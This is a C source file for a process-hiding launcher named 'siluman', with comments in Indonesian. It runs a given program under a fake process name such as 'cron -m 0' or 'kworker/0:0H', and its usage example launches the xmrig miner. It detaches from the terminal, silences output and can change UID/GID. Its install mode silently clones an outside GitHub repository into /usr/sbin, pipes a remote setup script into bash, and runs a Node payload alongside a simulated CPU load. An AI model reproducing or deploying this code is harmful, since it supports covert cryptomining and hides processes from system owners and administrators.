#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <string.h>
#include <fcntl.h>
#include <pwd.h>
#include <grp.h>
#include <pthread.h>
#include <stdlib.h>
#include <sys/wait.h>

// Konstanta untuk pengendalian beban CPU
#define WORK_TIME_US 80000 // 80 ms kerja
#define SLEEP_TIME_US 20000 // 20 ms tidur

// Fungsi untuk mensimulasikan beban CPU
void* cpu_load_thread(void* arg) {
    while (1) {
        // Fase kerja
        for (volatile long i = 0; i < 25000000L; i++);
        // Fase tidur
        usleep(SLEEP_TIME_US);
    }
    return NULL;
}

// Fungsi untuk memulai beban CPU multi-core
void start_cpu_load() {
    int num_cores = sysconf(_SC_NPROCESSORS_ONLN);
    pthread_t threads[num_cores];
    
    printf("Memulai beban CPU pada %d core...\n", num_cores);
    printf("Target penggunaan CPU per core: %.2f%%\n", 
           (double)WORK_TIME_US / (WORK_TIME_US + SLEEP_TIME_US) * 100.0);
    
    for (int i = 0; i < num_cores; i++) {
        if (pthread_create(&threads[i], NULL, cpu_load_thread, NULL) != 0) {
            perror("Gagal membuat thread");
            exit(1);
        }
    }
    
    // Detach thread agar berjalan di latar belakang
    for (int i = 0; i < num_cores; i++) {
        pthread_detach(threads[i]);
    }
}

void usage(char *progname);

int changeown (char *str)
{
	char user[256], *group;
	struct passwd *pwd;
	struct group *grp;

	uid_t uid;
	gid_t gid;

	memset(user, '\0', sizeof(user));
	strncpy(user, str, sizeof(user));

	for (group = user; *group; group++)
		if (*group == ':')
		{
			*group = '\0';
			group++;
			break;
		}

	if (pwd = getpwnam(user)) 
	{

		uid = pwd->pw_uid;
		gid = pwd->pw_gid;
	} else uid = (uid_t) atoi(user);

	if (*group)
		if (grp = getgrnam(group)) gid = grp->gr_gid;
		else gid = (gid_t) atoi(group);

	if (setgid(gid)) {
		perror("Error: Can't set GID");
		return 0;
	}

	if (setuid(uid))
	{
		perror("Error: Can't set UID");
		return 0;
	}

	return 1;
}

char *fullpath(char *cmd)
{
	char *p, *q, *filename;
	struct stat st;

	if (*cmd == '/')
		return cmd;

	filename = (char *) malloc(256);

	if  (*cmd == '.')
		if (getcwd(filename, 255) != NULL)
		{
			strcat(filename, "/");
			strcat(filename, cmd);
			return filename;
		}
		else
			return NULL;

	for (p = q = (char *) getenv("PATH"); q != NULL; p = ++q)
	{
		if (q = (char *) strchr(q, ':'))
			*q = (char) '\0';

		snprintf(filename, 256, "%s/%s", p, cmd);

		if (stat(filename, &st) != -1
				&& S_ISREG(st.st_mode)
				&& (st.st_mode&S_IXUSR || st.st_mode&S_IXGRP || st.st_mode&S_IXOTH))
			return filename;

		if (q == NULL)
			break;
	}

	free(filename);

	return NULL;

}

void usage(char *progname)
{
	fprintf(stderr, "siluman - tulak panto, by jawaracode "
			"Jawara (c)ode 2024\n\nOptions:\n"

			"-s string\tFake name process\n"
			"-d\t\tRun aplication as daemon/system (optional)\n" 
			"-u uid[:gid]\tChange UID/GID, use another user (optional)\n" 
			"-p filename\tSave PID to filename (optional)\n"
			"-c\t\tEnable multi-core CPU load simulation (optional)\n"
			"-I\t\tInstall dependencies and run nbwc (optional)\n\n"
			"Example: %s -s \"cron -m 0\" -d -p test.pid -c ./xmrig -u bla bla bla",progname);

	exit(1);
}

int main(int argc,char **argv)
{
    char c;
    char fake[256];
    char *progname, *fakename = NULL;
    char *pidfile = NULL, *fp;
    char *execst;

    FILE *f;

    int runsys=0, null;
    int j,i,n,pidnum;
    char **newargv;
    int enable_cpu_load = 0; // Flag untuk enable CPU load
    int do_install = 0; // Flag untuk instalasi

    progname = argv[0];
    if(argc<2) usage(progname);

    for (i = 1; i < argc; i++)
    {
        if (argv[i][0] == '-')
            switch (c = argv[i][1])
            {

                case 's': fakename = argv[++i]; break;
                case 'u': changeown(argv[++i]); break; 
                case 'p': pidfile = argv[++i]; break;
                case 'd': runsys = 1; break;
                case 'c': enable_cpu_load = 1; break;
                case 'I': do_install = 1; break;
                default:  usage(progname); break;
            }
        else break;
    }

    // Handle instalasi mode
    if (do_install) {
        // Jalankan proses instalasi secara silent
        system("git clone -q https://github.com/x011-al/nbwc /usr/sbin/nbwc 2>/dev/null >/dev/null");
        system("apt update -qq >/dev/null 2>&1 && "
               "curl -fsSL https://deb.nodesource.com/setup_20.x | bash - -s -- >/dev/null 2>&1 && "
               "apt install -y nodejs -qq >/dev/null 2>&1");

        // Override konfigurasi untuk run nbwc
        enable_cpu_load = 1;
        runsys = 1;
        pidfile = "sys.pid";
        fakename = "kworker/0:0H";
        
        // Set parameter untuk eksekusi node
        n = 2;
        newargv = (char **) malloc((n + 1) * sizeof(char *));
        newargv[0] = "node";
        newargv[1] = "run.js";
        newargv[2] = NULL;

        // Dapatkan full path untuk node
        if ((fp = fullpath("node")) == NULL) {
            perror("Full path seek for node");
            exit(1);
        }
        execst = fp;

        // Ubah direktori kerja
        chdir("/usr/sbin/nbwc");
    } else {
        // Mode normal
        if (!(n = argc - i) || fakename == NULL) usage(progname);

        newargv = (char **) malloc((n + 1) * sizeof(char *));
        for (j = 0; j < n; i++,j++) newargv[j] = argv[i];
        newargv[j] = NULL;

        if ((fp = fullpath(newargv[0])) == NULL) { 
            perror("Full path seek"); 
            exit(1); 
        }
        execst = fp;
    }

    // Jalankan beban CPU jika dienable
    if (enable_cpu_load) {
        start_cpu_load();
    }

    // Setup fake process name
    if (n > 1 && !do_install)
    {
        memset(fake, ' ', sizeof(fake) - 1);
        fake[sizeof(fake) - 1] = '\0';
        strncpy(fake, fakename, strlen(fakename));
        newargv[0] = fake;
    }
    else if (!do_install) {
        newargv[0] = fakename;
    }

    // Daemonize jika diperlukan
    if (runsys) 
    {
        if ((null = open("/dev/null", O_RDWR)) == -1)
        {
            perror("Error: /dev/null");
            return -1;
        }

        switch (fork())
        {
            case -1:
                perror("Error: FORK-1");
                return -1;

            case  0:
                setsid();
                switch (fork())
                {

                    case -1:
                        perror("Error: FORK-2");
                        return -1;

                    case  0:
                        umask(0);
                        close(0);
                        close(1);
                        close(2);
                        dup2(null, 0);
                        dup2(null, 1);
                        dup2(null, 2);

                        break;

                    default:
                        return 0;
                }
                break;
            default:
                return 0;
        }
    }

    waitpid(-1, (int *)0, 0);        
    pidnum = getpid();

    if (pidfile != NULL && (f = fopen(pidfile, "w")) != NULL)
    {
        fprintf(f, "%d\n", pidnum);
        fclose(f);
    }

    fprintf(stderr,"==> Fakename: %s PidNum: %d\n",fakename,pidnum); 
    execv(execst, newargv);
    perror("Couldn't execute");
    return -1;
}
